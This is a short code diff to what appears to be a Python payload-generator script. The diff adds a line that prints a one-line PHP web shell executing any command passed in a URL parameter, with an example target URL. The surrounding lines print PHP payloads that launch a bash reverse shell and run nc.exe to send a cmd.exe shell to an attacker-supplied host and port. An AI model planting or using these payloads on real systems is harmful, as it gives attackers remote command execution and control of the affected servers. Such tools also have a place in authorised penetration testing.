@@ -64,6 +64,7 @@ def main():
 
     # Web cradles
     print_separator("WEB", "Web")
+    print("<?=`$_GET[0]`?>  # Usage: http://target.com/path/to/shell.php?0=command\n")
     print(f"<?php exec(\"{bash_shell}\");?>\n")
     print(f"<?php exec(\"C:\\ProgramData\\System\\\\nc.exe {lhost} {lport} -e cmd.exe\");?>")
 
